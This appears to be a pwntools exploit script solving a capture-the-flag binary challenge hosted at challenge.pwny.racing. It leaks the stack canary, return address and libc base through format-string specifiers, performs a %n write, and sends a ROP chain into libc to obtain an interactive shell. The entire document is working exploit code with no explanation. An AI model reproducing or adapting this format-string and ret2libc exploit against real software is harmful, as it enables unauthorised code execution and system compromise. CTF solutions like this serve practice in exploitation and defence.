from pwn import *

HOST, PORT = "challenge.pwny.racing", "11530"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil(". ")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]


def leak(idx):
    r.recvuntil('pass: ')
    payload = '%' + str(idx) + '$p'
    r.sendline(payload)
    msg = r.recvuntil(' is incorrect', drop=True)
    print hexdump(msg)
    return msg

idx = 0xa4 / 4 + 6
# 1
canary = int(leak(idx - 4), 16)
print hex(canary)
# 2
ret = int(leak(idx), 16)
print 'ret addr:', hex(ret)
base=ret-0x9ec

libc = int(leak(idx + (0x3c / 4) + 1),16) - 0x18e81
print hex(libc)

# cozy way to raise exception without exit
#ey

# 3
r.sendline('%29477c%' + str(idx + 1) + '$n')
r.recvuntil('is incorrect')

# pop ebp; ret
pr = 0x00000aab + base
# pop edi; pop ebp; ret
ppr = 0x00000aaa + base

rop = "A" * 128 + ''.join(p32(x) for x in [
    canary,
    0, 0,
    0,
    libc+0x3cd10,
    0,
    libc+0x0017B8CF,
    # base+0x94b
])

print hexdump(rop)

assert all(x not in rop for x in '\r\n \t\x0c')

# 4!
r.sendline(rop)
r.interactive()